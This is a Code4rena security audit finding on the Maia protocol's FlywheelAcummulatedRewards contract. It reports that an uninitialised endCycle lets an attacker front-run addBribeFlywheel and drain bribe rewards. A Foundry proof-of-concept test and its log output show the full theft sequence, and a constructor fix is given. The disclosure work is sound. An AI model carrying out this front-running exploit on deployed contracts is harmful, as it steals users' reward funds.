## Tags

- bug
- 3 (High Risk)
- primary issue
- satisfactory
- selected for report
- sponsor confirmed
- upgraded by judge
- H-29

# [Malicious user can front-run Gauges's `addBribeFlywheel` to steal bribe rewards](https://github.com/code-423n4/2023-05-maia-findings/issues/206) 

# Lines of code

https://github.com/code-423n4/2023-05-maia/blob/main/src/rewards/rewards/FlywheelAcummulatedRewards.sol#L26
https://github.com/code-423n4/2023-05-maia/blob/main/src/rewards/rewards/FlywheelAcummulatedRewards.sol#L46-L54


# Vulnerability details

## Impact
When Gauge in initial setup and flywheel is created and added to the gauge via `addBribeFlywheel`. Malicious user can front-run this to steal rewards, this could happened due to uninitialized `endCycle` inside `FlywheelAcummulatedRewards` contract.

## Proof of Concept
Consider this scenario :

1. Gauge is first time created, then admin deposit 100 eth to depot reward.
2. FlyWheel also created, using 'FlywheelBribeRewards` that inherent `FlywheelAcummulatedRewards` implementation.
3. Malicious attacker that `addBribeFlywheel` is about to be called by owner, and front run it by calling `incrementGauge` a huge amount of gauge token to this gauge.
4. `addBribeFlywheel` is executed.
5. Now malicious user trigger `accrueBribes` and claim reward.
6. bribe rewards now stolen, malicious user can immediately decrement his gauge from this contract.

All of this possible, because `endCycle` is not initialized inside `FlywheelAcummulatedRewards` when first created : 

https://github.com/code-423n4/2023-05-maia/blob/main/src/rewards/rewards/FlywheelAcummulatedRewards.sol#L26-L35

```solidity
abstract contract FlywheelAcummulatedRewards is BaseFlywheelRewards, IFlywheelAcummulatedRewards {
    using SafeCastLib for uint256;

    /*//////////////////////////////////////////////////////////////
                        REWARDS CONTRACT STATE
    //////////////////////////////////////////////////////////////*/

    /// @inheritdoc IFlywheelAcummulatedRewards
    uint256 public immutable override rewardsCycleLength;

    /// @inheritdoc IFlywheelAcummulatedRewards
    uint256 public override endCycle; // NOTE INITIALIZED INSIDE CONSTRUCTOR

    /**
     * @notice Flywheel Instant Rewards constructor.
     *  @param _flywheel flywheel core contract
     *  @param _rewardsCycleLength the length of a rewards cycle in seconds
     */
    constructor(FlywheelCore _flywheel, uint256 _rewardsCycleLength) BaseFlywheelRewards(_flywheel) {
        rewardsCycleLength = _rewardsCycleLength;
    }
    ...

}
```
So right after it is created and attached to gauge, distribution of reward can be called immediately via `accrueBribes` inside gauge, if no previous user put his gauge token into this gauge contract, rewards can easily drained.

Foundry PoC (add this test inside `BaseV2GaugeTest.t.sol`) :

```solidity
    function testAccrueAndClaimBribesAbuse() external {
        address alice = address(0xABCD);
        MockERC20 token = new MockERC20("test token", "TKN", 18);
        FlywheelCore flywheel = createFlywheel(token);
        FlywheelBribeRewards bribeRewards = FlywheelBribeRewards(
            address(flywheel.flywheelRewards())
        );
        gaugeToken.setMaxDelegates(1);
        token.mint(address(depot), 100 ether);

        // ALICE SEE THAT THIS IS NEW GAUGE, about to add new NEW FLYWHEEL REWARDS

        // alice put a lot of his hermes or could also get from flash loan
        hermes.mint(alice, 100e18);
        hevm.startPrank(alice);
        hermes.approve(address(gaugeToken), 100e18);
        gaugeToken.mint(alice, 100e18);
        gaugeToken.delegate(alice);
        gaugeToken.incrementGauge(address(gauge), 100e18);
        console.log("hermes total supply");
        console.log(hermes.totalSupply());
        hevm.stopPrank();
        // NEW BRIBE FLYWHEEL IS ADDED
        hevm.expectEmit(true, true, true, true);
        emit AddedBribeFlywheel(flywheel);
        gauge.addBribeFlywheel(flywheel);
        // ALICE ACCRUE BRIBES
        gauge.accrueBribes(alice);
        console.log("bribe rewards balance before claim : ");
        console.log(token.balanceOf(address(bribeRewards)));

        flywheel.claimRewards(alice);
        console.log("bribe rewards balance after claim : ");
        console.log(token.balanceOf(address(bribeRewards)));

        console.log("alice rewards balance : ");
        console.log(token.balanceOf(alice));
        // after steal reward, alice could just disengage from the gauge, and look for another new gauge with new flywheel
        hevm.startPrank(alice);
        gaugeToken.decrementGauge(address(gauge), 100e18);
        hevm.stopPrank();
    }
```

PoC log output :

```
  bribe rewards balance before claim : 
  100000000000000000000
  bribe rewards balance after claim : 
  0
  alice rewards balance : 
  100000000000000000000
```

## Tools Used

Manual review

## Recommended Mitigation Steps

initialized `endCycle` inside `FlywheelAcummulatedRewards` :

```solidity
    constructor(
        FlywheelCore _flywheel,
        uint256 _rewardsCycleLength
    ) BaseFlywheelRewards(_flywheel) {
        rewardsCycleLength = _rewardsCycleLength;
        endCycle = ((block.timestamp.toUint32() + rewardsCycleLength) /
                rewardsCycleLength) * rewardsCycleLength;        
    }
```


## Assessed type

Other